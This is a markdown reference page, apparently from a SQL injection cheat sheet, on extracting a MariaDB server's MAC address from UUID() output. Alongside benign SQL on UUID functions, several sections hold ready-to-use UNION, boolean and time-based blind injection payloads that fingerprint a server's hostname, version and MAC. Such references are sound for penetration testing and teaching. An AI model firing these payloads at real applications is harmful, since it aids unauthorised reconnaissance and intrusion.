---
title: Server MAC Address
description: How to retrieve the server MAC address via UUID in MariaDB
category: Information Gathering
order: 8
tags: ["MAC address", "UUID", "hardware information"]
lastUpdated: 2025-12-18
---

## Server MAC Address

The Universally Unique Identifier (UUID) in MariaDB is a 128-bit number where the last 12 characters represent the network interface's MAC address. This can be used to identify the physical hardware running the MariaDB server.

```sql
SELECT UUID()
-- Returns: aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee
```

The last part `eeeeeeeeeeee` (12 hex digits) represents the MAC address.

**Note:** On some operating systems, MariaDB may return a 48-bit random string instead of the actual MAC address for security reasons.

## UUID() Function Basics

```sql
-- Generate a UUID
SELECT UUID()
-- Example: 6ccd780c-baba-1026-9564-5b8c65604390

-- UUID format: xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
-- Total length: 36 characters (32 hex + 4 hyphens)

-- Each call generates a unique value
SELECT UUID() AS uuid1, UUID() AS uuid2
-- uuid1 and uuid2 will be different
```

## Extracting MAC Address from UUID

### Using SUBSTRING

```sql
-- Extract last 12 characters (MAC address portion)
SELECT SUBSTRING(UUID(), -12) AS mac_portion

-- Or using positive index (position 25 to end)
SELECT SUBSTRING(UUID(), 25) AS mac_portion

-- Both methods extract the same portion
SELECT
  SUBSTRING(UUID(), -12) AS method1,
  SUBSTRING(UUID(), 25) AS method2
-- Note: Results will differ because each UUID() call generates a new value
```

### Using RIGHT

```sql
SELECT RIGHT(UUID(), 12) AS mac_portion
```

### Using SUBSTRING_INDEX

```sql
-- Get everything after the last hyphen
SELECT SUBSTRING_INDEX(UUID(), '-', -1) AS mac_portion
```

### Format MAC with Colons

```sql
-- Convert to standard MAC address format (xx:xx:xx:xx:xx:xx)
SELECT CONCAT_WS(':',
  SUBSTRING(mac_part, 1, 2),
  SUBSTRING(mac_part, 3, 2),
  SUBSTRING(mac_part, 5, 2),
  SUBSTRING(mac_part, 7, 2),
  SUBSTRING(mac_part, 9, 2),
  SUBSTRING(mac_part, 11, 2)
) AS formatted_mac
FROM (SELECT SUBSTRING_INDEX(UUID(), '-', -1) AS mac_part) AS u
-- Returns: 5b:8c:65:60:43:90
```

## UUID Components

UUID format: `xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx`

| Component       | Position | Length | Description                     |
| --------------- | -------- | ------ | ------------------------------- |
| time-low        | 1-8      | 8      | Low 32 bits of timestamp        |
| time-mid        | 10-13    | 4      | Middle 16 bits of timestamp     |
| time-hi-version | 15-18    | 4      | High 12 bits + version (4 bits) |
| clock-seq       | 20-23    | 4      | Clock sequence                  |
| node (MAC)      | 25-36    | 12     | 48-bit node ID (MAC address)    |

### Extract Each Component

```sql
-- Split UUID into all components using a derived table
SELECT
  SUBSTRING_INDEX(u, '-', 1) AS time_low,
  SUBSTRING_INDEX(SUBSTRING_INDEX(u, '-', 2), '-', -1) AS time_mid,
  SUBSTRING_INDEX(SUBSTRING_INDEX(u, '-', 3), '-', -1) AS time_hi_version,
  SUBSTRING_INDEX(SUBSTRING_INDEX(u, '-', 4), '-', -1) AS clock_seq,
  SUBSTRING_INDEX(u, '-', -1) AS node_mac
FROM (SELECT UUID() AS u) AS uuid_source
```

### Extract Individual Parts

```sql
-- Timestamp portion (first 8 chars)
SELECT LEFT(UUID(), 8) AS timestamp_low

-- Time-mid portion (chars 10-13)
SELECT SUBSTRING(UUID(), 10, 4) AS time_mid

-- Time-hi-and-version (chars 15-18)
SELECT SUBSTRING(UUID(), 15, 4) AS time_hi_version

-- Clock-seq portion (chars 20-23)
SELECT SUBSTRING(UUID(), 20, 4) AS clock_seq

-- Node/MAC portion (chars 25-36)
SELECT SUBSTRING(UUID(), 25) AS node_mac
```

## UUID_SHORT() Function

`UUID_SHORT()` returns a 64-bit unsigned integer (bigint) instead of a string:

```sql
SELECT UUID_SHORT()
-- Returns: 92395783831158784 (example)
```

### Structure

The UUID_SHORT value is calculated as:

```text
(server_id & 255) << 56 + (server_startup_time_in_seconds << 24) + incremented_variable
```

```sql
-- Get UUID_SHORT with server_id
SELECT UUID_SHORT() AS short_uuid, @@server_id AS server_id
```

## UUID in Injection Contexts

### UNION SELECT with UUID

```sql
-- Extract full UUID
' UNION SELECT 1, UUID() -- -

-- Extract MAC address portion only
' UNION SELECT 1, SUBSTRING_INDEX(UUID(), '-', -1) -- -

-- Full query example
SELECT id, username FROM users WHERE id = 999
UNION SELECT 1, UUID()

-- Extract MAC in UNION
SELECT id, username FROM users WHERE id = 999
UNION SELECT 1, SUBSTRING_INDEX(UUID(), '-', -1)
```

### Subquery Extraction

```sql
SELECT (SELECT UUID()) AS server_uuid
```

### Combine with Server Info

```sql
-- CONCAT UUID with hostname
SELECT CONCAT(
  'Host: ', @@hostname,
  ' MAC: ', SUBSTRING_INDEX(UUID(), '-', -1)
) AS server_info

-- In UNION injection
' UNION SELECT 1, CONCAT(@@hostname, ':', SUBSTRING_INDEX(UUID(), '-', -1)) -- -
```

## UUID Binary Functions

### Convert UUID to Binary

```sql
-- Remove hyphens and convert to 16-byte binary
SELECT UNHEX(REPLACE(UUID(), '-', '')) AS binary_uuid

-- Verify length is 16 bytes (128 bits)
SELECT LENGTH(UNHEX(REPLACE(UUID(), '-', ''))) AS byte_len
-- Returns: 16
```

### Convert Binary Back to Hex

```sql
SELECT HEX(UNHEX(REPLACE(UUID(), '-', ''))) AS hex_uuid
-- Returns: 32-character uppercase hex string
```

### SYS_GUID() Alternative (MariaDB-specific)

```sql
-- SYS_GUID() returns uppercase hex without hyphens (Oracle-compatible)
SELECT SYS_GUID() AS guid
-- Returns: 6CCD780CBABA102695645B8C65604390 (32 uppercase hex chars)

-- Note: Not available in all MariaDB versions
-- Returns same format as REPLACE(UUID(), '-', '') but uppercase
```

## UUID Without Hyphens

```sql
-- Remove hyphens for compact format
SELECT REPLACE(UUID(), '-', '') AS compact_uuid
-- Returns: 6ccd780cbaba102695645b8c65604390 (32 chars)

-- Length verification
SELECT LENGTH(REPLACE(UUID(), '-', '')) AS len
-- Returns: 32
```

## Blind Extraction of MAC Address

### Character-by-Character Extraction

```sql
-- Extract MAC address one character at a time
SELECT SUBSTRING(SUBSTRING_INDEX(UUID(), '-', -1), 1, 1) AS char1
SELECT SUBSTRING(SUBSTRING_INDEX(UUID(), '-', -1), 2, 1) AS char2
-- ... continue for all 12 characters
```

### ASCII Value Extraction

```sql
-- Get ASCII value of first MAC character
SELECT ASCII(SUBSTRING(SUBSTRING_INDEX(UUID(), '-', -1), 1, 1)) AS ascii_val
-- Valid values: 48-57 (0-9), 65-70 (A-F), 97-102 (a-f)
```

### In Blind Injection Context

```sql
-- Check if first MAC char is '5'
' AND SUBSTRING(SUBSTRING_INDEX(UUID(), '-', -1), 1, 1) = '5' -- -

-- Check ASCII value
' AND ASCII(SUBSTRING(SUBSTRING_INDEX(UUID(), '-', -1), 1, 1)) = 53 -- -

-- Time-based extraction
' AND IF(SUBSTRING(SUBSTRING_INDEX(UUID(), '-', -1), 1, 1) = '5', SLEEP(5), 0) -- -

-- Boolean-based extraction example
SELECT id FROM users WHERE id = 1 AND SUBSTRING(SUBSTRING_INDEX(UUID(), '-', -1), 1, 1) = '5'
```

### Validate MAC Format

```sql
SELECT IF(
  SUBSTRING_INDEX(UUID(), '-', -1) REGEXP '^[0-9a-fA-F]{12}$',
  1, 0
) AS is_valid_mac
```

## Server Identification via UUID

### Combine with Server Variables

```sql
SELECT
  @@hostname AS hostname,
  @@version AS version,
  SUBSTRING_INDEX(UUID(), '-', -1) AS session_mac

-- In UNION injection
' UNION SELECT 1, CONCAT_WS('|', @@hostname, @@version, SUBSTRING_INDEX(UUID(), '-', -1)) -- -
```

### UUID Pattern Validation

```sql
-- Verify UUID format in WHERE clause
SELECT 1 FROM DUAL
WHERE UUID() REGEXP '^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$'
```

## Practical Use Cases

### Server Fingerprinting

```sql
-- Full server identification
SELECT CONCAT_WS('\n',
  CONCAT('Hostname: ', @@hostname),
  CONCAT('Version: ', @@version),
  CONCAT('MAC/Node: ', SUBSTRING_INDEX(UUID(), '-', -1)),
  CONCAT('Port: ', @@port)
) AS server_fingerprint
```

### In UNION Injection

```sql
-- Extract all server identification in one query
' UNION SELECT 1, CONCAT_WS('|',
  @@hostname,
  @@version,
  SUBSTRING_INDEX(UUID(), '-', -1)
) -- -

-- Alternative with pipe separator
SELECT id, username FROM users WHERE id = 999
UNION SELECT 1, CONCAT_WS('|', @@hostname, @@version, SUBSTRING_INDEX(UUID(), '-', -1))
```

## Notes

- MAC address extraction may not work on all systems (some return random values)
- Each UUID() call generates a new value, but the MAC portion may be consistent
- UUID_SHORT() does not contain MAC address information
- In containerized environments, the MAC may be virtualized
